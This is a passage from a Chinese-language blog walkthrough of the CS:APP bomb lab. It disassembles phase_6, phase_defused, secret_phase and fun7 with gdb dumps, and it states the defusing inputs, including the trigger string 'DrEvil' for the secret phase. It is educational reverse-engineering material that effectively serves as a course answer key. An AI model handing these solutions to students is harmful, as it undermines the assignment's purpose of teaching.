18          cmp    $0x18,%rsi</span><br><span class="line">  401195:74 14                je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line">  401197:8b 0c 34             mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">  40119a:83 f9 01             cmp    $0x1,%ecx</span><br><span class="line">  40119d:7e e4                jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line">  40119f:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4011a4:ba d0 32 60 00       mov    $0x6032d0,%edx</span><br><span class="line">  4011a9:eb cb                jmp    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">  4011ab:48 8b 5c 24 20       mov    0x20(%rsp),%rbx</span><br><span class="line">  4011b0:48 8d 44 24 28       lea    0x28(%rsp),%rax</span><br><span class="line">  4011b5:48 8d 74 24 50       lea    0x50(%rsp),%rsi</span><br><span class="line">  4011ba:48 89 d9             mov    %rbx,%rcx</span><br><span class="line">  4011bd:48 8b 10             mov    (%rax),%rdx</span><br><span class="line">  4011c0:48 89 51 08          mov    %rdx,0x8(%rcx)</span><br><span class="line">  4011c4:48 83 c0 08          add    $0x8,%rax</span><br><span class="line">  4011c8:48 39 f0             cmp    %rsi,%rax</span><br><span class="line">  4011cb:74 05                je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line">  4011cd:48 89 d1             mov    %rdx,%rcx</span><br><span class="line">  4011d0:eb eb                jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line">  4011d2:48 c7 42 08 00 00 00 movq   $0x0,0x8(%rdx)</span><br><span class="line">  4011d9:00</span><br><span class="line">  4011da:bd 05 00 00 00       mov    $0x5,%ebp</span><br><span class="line">  4011df:48 8b 43 08          mov    0x8(%rbx),%rax</span><br><span class="line">  4011e3:8b 00                mov    (%rax),%eax</span><br><span class="line">  4011e5:39 03                cmp    %eax,(%rbx)</span><br><span class="line">  4011e7:7d 05                jge    4011ee &lt;phase_6+0xfa&gt;</span><br><span class="line">  4011e9:e8 4c 02 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4011ee:48 8b 5b 08          mov    0x8(%rbx),%rbx</span><br><span class="line">  4011f2:83 ed 01             sub    $0x1,%ebp</span><br><span class="line">  4011f5:75 e8                jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">  4011f7:48 83 c4 50          add    $0x50,%rsp</span><br><span class="line">  4011fb:5b                   pop    %rbx</span><br><span class="line">  4011fc:5d                   pop    %rbp</span><br><span class="line">  4011fd:41 5c                pop    %r12</span><br><span class="line">  4011ff:41 5d                pop    %r13</span><br><span class="line">  401201:41 5e                pop    %r14</span><br><span class="line">  401203:c3                   retq</span><br></pre></td></tr></table></figure><p>这一关我们看到了熟悉的read_six_number!因为前面已经探讨过了这个函数的功能<del>没有人在这段代码下毒</del>，于是我们就不再进去仔细看这段代码的逻辑。这次我们速战速决，不去分析read之前的代码了，直接上断点到read之后，然后看一下寄存器，找到对应的值存在哪，输入1 2 3 4 5 6，然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/20d $rsp</span><br><span class="line">0x7fffffffdc70:1234</span><br><span class="line">0x7fffffffdc80:5600</span><br><span class="line">0x7fffffffdc90:-87523276700</span><br><span class="line">0x7fffffffdca0:0041993720</span><br><span class="line">0x7fffffffdcb0:6306064063060640</span><br></pre></td></tr></table></figure><p>显然，六个数字完整的摆在了栈顶。假设分别为abcdef,接着把第一个值给了r14,r12,rbp,eax，然后判断eax-1和5的大小，比他大就爆掉，所以 $a&lt;=5$,然后判%r12和6的关系，如果等于6跳转，否则不跳转，这里显然 $a=5$ 是一个极其特殊的情况，为了hack掉这个炸弹，我们忽略细节往他想要的答案处构造，直接让$a=5$，跟着跳转过去。把7减去 $a$,也就是 $%edx=7-5=2$,又把%edx送给了a,一连串操作之后a变成了2。然后的然后发现了重点！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">401160:89 ca                mov    %ecx,%edx</span><br><span class="line">401162:2b 10                sub    (%rax),%edx</span><br><span class="line">401164:89 10                mov    %edx,(%rax)</span><br><span class="line">401166:48 83 c0 04          add    $0x4,%rax</span><br><span class="line">40116a:48 39 f0             cmp    %rsi,%rax</span><br><span class="line">40116d:75 f1                jne    401160 &lt;phase_6+0x6c&gt;</span><br></pre></td></tr></table></figure><p>之前的操作中让rsi变成了偏移0x18的位置，也就是第六个数字之后的位置，那么这一段代码的意图就很显然了，把六个数字都做一遍处理，用7减去然后再放回去。<br>但这都不是重点，我们往后看，%r12d为1往下执行，到了后面用了一行间接寻址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">401138:8b 04 84             mov    (%rsp,%rax,4),%eax</span><br></pre></td></tr></table></figure><p>把第二个数取了出来，发现和%rbp做了比较，%rbp往前找发现值为栈顶也就是间接寻址到第一个数字,必须不相等，否则爆掉！然后执行了上面我们所说那段循环。并且我们在此处找到了一串循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">401114:4c 89 ed             mov    %r13,%rbp</span><br><span class="line">401117:41 8b 45 00          mov    0x0(%r13),%eax</span><br><span class="line">40111b:83 e8 01             sub    $0x1,%eax</span><br><span class="line">40111e:83 f8 05             cmp    $0x5,%eax</span><br><span class="line">401121:76 05                jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line">401123:e8 12 03 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401128:41 83 c4 01          add    $0x1,%r12d</span><br><span class="line">40112c:41 83 fc 06          cmp    $0x6,%r12d</span><br><span class="line">401130:74 21                je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">401132:44 89 e3             mov    %r12d,%ebx</span><br><span class="line">401135:48 63 c3             movslq %ebx,%rax</span><br><span class="line">401138:8b 04 84             mov    (%rsp,%rax,4),%eax</span><br><span class="line">40113b:39 45 00             cmp    %eax,0x0(%rbp)</span><br><span class="line">40113e:75 05                jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">401140:e8 f5 02 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401145:83 c3 01             add    $0x1,%ebx</span><br><span class="line">401148:83 fb 05             cmp    $0x5,%ebx</span><br><span class="line">40114b:7e e8                jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">40114d:49 83 c5 04          add    $0x4,%r13</span><br><span class="line">401151:eb c1                jmp    401114 &lt;phase_6+0x20&gt;</span><br></pre></td></tr></table></figure><p>这段代码检查所有值是否有相等且是否有大于6的，如果有就爆掉。如果没有爆掉就执行上面讨论的那段循环，进行值的变化。<br>然后紧接着又来了一大段的循环<del>内心崩溃，就不能简单点吗？</del></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">401176:48 8b 52 08          mov    0x8(%rdx),%rdx</span><br><span class="line">40117a:83 c0 01             add    $0x1,%eax</span><br><span class="line">40117d:39 c8                cmp    %ecx,%eax</span><br><span class="line">40117f:75 f5                jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">401181:eb 05                jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">401183:ba d0 32 60 00       mov    $0x6032d0,%edx</span><br><span class="line">401188:48 89 54 74 20       mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">40118d:48 83 c6 04          add    $0x4,%rsi</span><br><span class="line">401191:48 83 fe 18          cmp    $0x18,%rsi</span><br><span class="line">401195:74 14                je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line">401197:8b 0c 34             mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">40119a:83 f9 01             cmp    $0x1,%ecx</span><br><span class="line">40119d:7e e4                jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line">40119f:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">4011a4:ba d0 32 60 00       mov    $0x6032d0,%edx</span><br><span class="line">4011a9:eb cb                jmp    401176 &lt;phase_6+0x82&gt;</span><br></pre></td></tr></table></figure><p>猜测这应该是一段while循环，跳出条件可能是处理完了所有的数字跳到0x4011ab(很像jump to middle的翻译方式)。然后我们看到rdx和一串地址0x6032d0有关，打印一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/40d 0x6032d0</span><br><span class="line">0x6032d0 &lt;node1&gt;:761001000</span><br><span class="line">0x6032d8 &lt;node1+8&gt;:-32509600000</span><br><span class="line">0x6032e0 &lt;node2&gt;:-880002000</span><br><span class="line">0x6032e8 &lt;node2+8&gt;:-16509600000</span><br><span class="line">0x6032f0 &lt;node3&gt;:-1003003000</span><br></pre></td></tr></table></figure><p>node，这难道是一个结构体？多打印一点出来试试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/100 0x6032d0</span><br><span class="line">0x6032d0 &lt;node1&gt;:761001000</span><br><span class="line">0x6032d8 &lt;node1+8&gt;:-32509600000</span><br><span class="line">0x6032e0 &lt;node2&gt;:-880002000</span><br><span class="line">0x6032e8 &lt;node2+8&gt;:-16509600000</span><br><span class="line">0x6032f0 &lt;node3&gt;:-1003003000</span><br><span class="line">0x6032f8 &lt;node3+8&gt;:0519600000</span><br><span class="line">0x603300 &lt;node4&gt;:-772004000</span><br><span class="line">0x603308 &lt;node4+8&gt;:16519600000</span><br><span class="line">0x603310 &lt;node5&gt;:-351005000</span><br><span class="line">0x603318 &lt;node5+8&gt;:32519600000</span><br><span class="line">0x603320 &lt;node6&gt;:-691006000</span><br><span class="line">0x603328 &lt;node6+8&gt;:0000000</span><br><span class="line">0x603330:0000</span><br></pre></td></tr></table></figure><p>咦，我们读入六个数字，这里也只标记到6，会不会有什么阴谋呢？反正最终一定和这串地址有关，那我们仔细观察一下。感觉不太明显，换16进制试试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x6032d0 &lt;node1&gt;:0x4c0x010x000x000x010x000x000x00</span><br><span class="line">0x6032d8 &lt;node1+8&gt;:0xe00x320x600x000x000x000x000x00</span><br><span class="line">0x6032e0 &lt;node2&gt;:0xa80x000x000x000x020x000x000x00</span><br><span class="line">0x6032e8 &lt;node2+8&gt;:0xf00x320x600x000x000x000x000x00</span><br><span class="line">0x6032f0 &lt;node3&gt;:0x9c0x030x000x000x030x000x000x00</span><br><span class="line">0x6032f8 &lt;node3+8&gt;:0x000x330x600x000x000x000x000x00</span><br><span class="line">0x603300 &lt;node4&gt;:0xb30x020x000x000x040x000x000x00</span><br><span class="line">0x603308 &lt;node4+8&gt;:0x100x330x600x000x000x000x000x00</span><br><span class="line">0x603310 &lt;node5&gt;:0xdd0x010x000x000x050x000x000x00</span><br><span class="line">0x603318 &lt;node5+8&gt;:0x200x330x600x000x000x000x000x00</span><br><span class="line">0x603320 &lt;node6&gt;:0xbb0x010x000x000x060x000x000x00</span><br><span class="line">0x603328 &lt;node6+8&gt;:0x000x000x000x000x000x000x000x00</span><br></pre></td></tr></table></figure><p>还是没什么思路，去看看代码，发现有这么一串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">401176:48 8b 52 08          mov    0x8(%rdx),%rdx</span><br></pre></td></tr></table></figure><p>好像和偏移地址0x8有关，仔细看一下所有的node+8的位置，考虑到x86采用小端法，那么就要倒过来才能看明白。观察第一个，倒过来看值是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000006032e0</span><br></pre></td></tr></table></figure><p>这个地址不就正好在这一段里面吗！这是个指针，恰好也是8字节！而第六个指向了0x0，在c语言里面代表NULL，难道说这是个链表？而我们知道read_six_num读入六个int型数据，应该是四字节，也就是说最后对比大概率也是四字节，再加上之前我们分析出读入的数据应该在1-6之间，观察一下 我们猜测node+4的位置存放了我们的数据。我们从NULL入手倒着去找他们之间的连接关系，发现答案可能是:$6&lt;-5&lt;-4&lt;-3&lt;-2&lt;-1$的倒叙。但总感觉哪里不太对劲。这个顺序太特殊了，试一下，果然爆掉了。现在还剩前面四个字节没有使用，苦思冥想，还是想不出来。看了下别人的解法<del>实在是不想读那么长的汇编</del>，发现这是一个结构体，类似</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> value;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  node *next;</span><br><span class="line">&#125;node;</span><br></pre></td></tr></table></figure><p>前四个字节应该是对应的值，后四个字节是对应的序号，对这六个节点进行排序之后，按输出序号(注意小端法的特点)。<br><del>于是结果为:3 4 5 6 1 2</del><br>boom!傻了吧！网传教程早已经过时了，自力更生吧!<br>于是我们想到，之前一长串代码使得所有的值都变成了$7-x$，那么会不会结果在这上面改造呢？尝试性输入4 3 2 1 6 5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Good work!  On to the next...</span><br><span class="line">4 3 2 1 6 5</span><br><span class="line">Congratulations! You&apos;ve defused the bomb!</span><br></pre></td></tr></table></figure><p>果然！顺利结束,差点以为要去看那一长串汇编(逃。</p><h3 id="DLC"><a href="#DLC" class="headerlink" title="DLC"></a>DLC</h3><h4 id="被”欺骗”的单身狗"><a href="#被”欺骗”的单身狗" class="headerlink" title="被”欺骗”的单身狗"></a>被”欺骗”的单身狗</h4><p>8月23日，凌晨五点，天好热，电费好贵(电费*3)，作为一个上进的单身狗，我沉浸在代码的世界里，<del>顺利</del>解决掉了六个问题，程序对我表示了祝贺。</p><blockquote><p>Congratulations! You’ve defused the bomb!</p></blockquote><p>突然，我发现我被”歧视”了，或许因为我不是“付费”玩家的缘故，我没有找到实验指导书上告诉我的一个隐藏关卡，程序就直接结束了…为了探寻“充值入口”，我打开了符号表，搜索phase，找到了这个函数secret_phase。可是入口在哪呢？直接全局搜索，发现他出现在了phase_defused里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">00000000004015c4 &lt;phase_defused&gt;:</span><br><span class="line">  4015c4:48 83 ec 78          sub    $0x78,%rsp</span><br><span class="line">  4015c8:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax</span><br><span class="line">  4015cf:00 00</span><br><span class="line">  4015d1:48 89 44 24 68       mov    %rax,0x68(%rsp)</span><br><span class="line">  4015d6:31 c0                xor    %eax,%eax</span><br><span class="line">  4015d8:83 3d 81 21 20 00 06 cmpl   $0x6,0x202181(%rip)     # 603760 &lt;num_input_strings&gt;</span><br><span class="line">  4015df:75 5e                jne    40163f &lt;phase_defused+0x7b&gt;</span><br><span class="line">  4015e1:4c 8d 44 24 10       lea    0x10(%rsp),%r8</span><br><span class="line">  4015e6:48 8d 4c 24 0c       lea    0xc(%rsp),%rcx</span><br><span class="line">  4015eb:48 8d 54 24 08       lea    0x8(%rsp),%rdx</span><br><span class="line">  4015f0:be 19 26 40 00       mov    $0x402619,%esi</span><br><span class="line">  4015f5:bf 70 38 60 00       mov    $0x603870,%edi</span><br><span class="line">  4015fa:e8 f1 f5 ff ff       callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  4015ff:83 f8 03             cmp    $0x3,%eax</span><br><span class="line">  401602:75 31                jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401604:be 22 26 40 00       mov    $0x402622,%esi</span><br><span class="line">  401609:48 8d 7c 24 10       lea    0x10(%rsp),%rdi</span><br><span class="line">  40160e:e8 25 fd ff ff       callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  401613:85 c0                test   %eax,%eax</span><br><span class="line">  401615:75 1e                jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401617:bf f8 24 40 00       mov    $0x4024f8,%edi</span><br><span class="line">  40161c:e8 ef f4 ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401621:bf 20 25 40 00       mov    $0x402520,%edi</span><br><span class="line">  401626:e8 e5 f4 ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40162b:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401630:e8 0d fc ff ff       callq  401242 &lt;secret_phase&gt;</span><br><span class="line">  401635:bf 58 25 40 00       mov    $0x402558,%edi</span><br><span class="line">  40163a:e8 d1 f4 ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40163f:48 8b 44 24 68       mov    0x68(%rsp),%rax</span><br><span class="line">  401644:64 48 33 04 25 28 00 xor    %fs:0x28,%rax</span><br><span class="line">  40164b:00 00</span><br><span class="line">  40164d:74 05                je     401654 &lt;phase_defused+0x90&gt;</span><br><span class="line">  40164f:e8 dc f4 ff ff       callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  401654:48 83 c4 78          add    $0x78,%rsp</span><br></pre></td></tr></table></figure><p>名称叫拆弹，里面确大有玄机。而这个函数出现在了每一个关卡的后面，说明隐藏关一定有一个特殊的唤醒机制。而这个函数里面居然出现了sscanf和strings_not_equal，不符合正常操作的逻辑，也就是说，这里面对一个我们读入的字符串进行了判断。按照惯例，我们去找比较的两个字符串，找到了这两行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">401604:be 22 26 40 00       mov    $0x402622,%esi</span><br><span class="line">401609:48 8d 7c 24 10       lea    0x10(%rsp),%rdi</span><br></pre></td></tr></table></figure><p>也就是说在比较一个栈上的字符串和一个常量区的字符串，打印0x402622，看看是什么东西.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x402622</span><br><span class="line">0x402622:&quot;DrEvil&quot;</span><br></pre></td></tr></table></figure><p>果然，是一串有意义的字符串。可是，要怎么触发这个机制呢？经过测试，发现只有当到达最后一关，也就是第六关的时候，会走到一个奇怪的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4015fa:e8 f1 f5 ff ff       callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">4015ff:83 f8 03             cmp    $0x3,%eax</span><br><span class="line">401602:75 31                jne    401635 &lt;phase_defused+0x71&gt;</span><br></pre></td></tr></table></figure><p>而跳转过去的位置恰好是秘密关卡的后面，所以如果要进入秘密关卡，就不能跳转！看到判断sscanf的返回值是否等于3，心里已经有了点数。再往后，看到了一个字符串比较，于是打上断点，看看都发生了什么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x402619</span><br><span class="line">0x402619:&quot;%d %d %s&quot;</span><br><span class="line">(gdb) x/s 0x603870</span><br><span class="line">0x603870 &lt;input_strings+240&gt;:&quot;7 0&quot;</span><br></pre></td></tr></table></figure><p>打印前面的常量，发现了一个奇怪的串和一个奇怪的位置。%d%d%s应该是读入两个数字和一个字符串，从0x603870处读入，而0x603870是”7 0”，是我们在第二关输入的答案！尝试在第二关后面加一点东西hack一下，果然这样使得sscanf成功读入了三个数据。加什么字符串呢？往后看看到了字符串比较，那就是他了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That&apos;s number 2.  Keep going!</span><br><span class="line">0 207</span><br><span class="line">Halfway there!</span><br><span class="line">7 0 DrEvil</span><br><span class="line">So you got that one.  Try this one.</span><br><span class="line">ionefg</span><br><span class="line">Good work!  On to the next...</span><br><span class="line">4 3 2 1 6 5</span><br><span class="line">Curses, you&apos;ve found the secret phase!</span><br><span class="line">But finding it and solving it are quite different...</span><br></pre></td></tr></table></figure><p>果然触发了DLC剧情!</p><h4 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0000000000401242 &lt;secret_phase&gt;:</span><br><span class="line">  401242:53                   push   %rbx</span><br><span class="line">  401243:e8 56 02 00 00       callq  40149e &lt;read_line&gt;</span><br><span class="line">  401248:ba 0a 00 00 00       mov    $0xa,%edx</span><br><span class="line">  40124d:be 00 00 00 00       mov    $0x0,%esi</span><br><span class="line">  401252:48 89 c7             mov    %rax,%rdi</span><br><span class="line">  401255:e8 76 f9 ff ff       callq  400bd0 &lt;strtol@plt&gt;</span><br><span class="line">  40125a:48 89 c3             mov    %rax,%rbx</span><br><span class="line">  40125d:8d 40 ff             lea    -0x1(%rax),%eax</span><br><span class="line">  401260:3d e8 03 00 00       cmp    $0x3e8,%eax</span><br><span class="line">  401265:76 05                jbe    40126c &lt;secret_phase+0x2a&gt;</span><br><span class="line">  401267:e8 ce 01 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40126c:89 de                mov    %ebx,%esi</span><br><span class="line">  40126e:bf f0 30 60 00       mov    $0x6030f0,%edi</span><br><span class="line">  401273:e8 8c ff ff ff       callq  401204 &lt;fun7&gt;</span><br><span class="line">  401278:83 f8 02             cmp    $0x2,%eax</span><br><span class="line">  40127b:74 05                je     401282 &lt;secret_phase+0x40&gt;</span><br><span class="line">  40127d:e8 b8 01 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:bf 38 24 40 00       mov    $0x402438,%edi</span><br><span class="line">  401287:e8 84 f8 ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:e8 33 03 00 00       callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:5b                   pop    %rbx</span><br></pre></td></tr></table></figure><p>看到几串非常奇怪的代码,先进行简单的分析.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">401248:ba 0a 00 00 00       mov    $0xa,%edx</span><br><span class="line">40124d:be 00 00 00 00       mov    $0x0,%esi</span><br><span class="line">401252:48 89 c7             mov    %rax,%rdi</span><br><span class="line">401255:e8 76 f9 ff ff       callq  400bd0 &lt;strtol@plt&gt;</span><br><span class="line">40125a:48 89 c3             mov    %rax,%rbx</span><br><span class="line">40125d:8d 40 ff             lea    -0x1(%rax),%eax</span><br><span class="line">401260:3d e8 03 00 00       cmp    $0x3e8,%eax</span><br><span class="line">401265:76 05                jbe    40126c &lt;secret_phase+0x2a&gt;</span><br></pre></td></tr></table></figure><p>调用了strtol，这个函数需要三个参数，第一个为字符串，第二个为endptr,第三个为int型，表示base，然后把字符串转化为长整形数。也就是说这个地方把一串数字字符串转化成了一个整数然后与0x3e8进行了比较。而$0x3e8=1000$。再仔细看传入的参数，第三个表示base的参数为$0xa=10$,也就是10进制。<br>非常短的代码，根据前面的分析，读一行之后进行进制转换，然后判断减１是否小于等于0x3e8,如果是，就把这个数和一串地址传入fun7，然后判断返回值是否等于２．</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0000000000401204 &lt;fun7&gt;:</span><br><span class="line">  401204:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  401208:48 85 ff             test   %rdi,%rdi</span><br><span class="line">  40120b:74 2b                je     401238 &lt;fun7+0x34&gt;</span><br><span class="line">  40120d:8b 17                mov    (%rdi),%edx</span><br><span class="line">  40120f:39 f2                cmp    %esi,%edx</span><br><span class="line">  401211:7e 0d                jle    401220 &lt;fun7+0x1c&gt;</span><br><span class="line">  401213:48 8b 7f 08          mov    0x8(%rdi),%rdi</span><br><span class="line">  401217:e8 e8 ff ff ff       callq  401204 &lt;fun7&gt;</span><br><span class="line">  40121c:01 c0                add    %eax,%eax</span><br><span class="line">  40121e:eb 1d                jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401220:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401225:39 f2                cmp    %esi,%edx</span><br><span class="line">  401227:74 14                je     40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401229:48 8b 7f 10          mov    0x10(%rdi),%rdi</span><br><span class="line">  40122d:e8 d2 ff ff ff       callq  401204 &lt;fun7&gt;</span><br><span class="line">  401232:8d 44 00 01          lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401236:eb 05                jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401238:b8 ff ff ff ff       mov    $0xffffffff,%eax</span><br><span class="line">  40123d:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  401241:c3                   retq</span><br></pre></td></tr></table></figure><p>fun7中我们可以发现，这玩意儿tmd还是一个递归的东西。于是我们尝试将他翻译成c语言</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 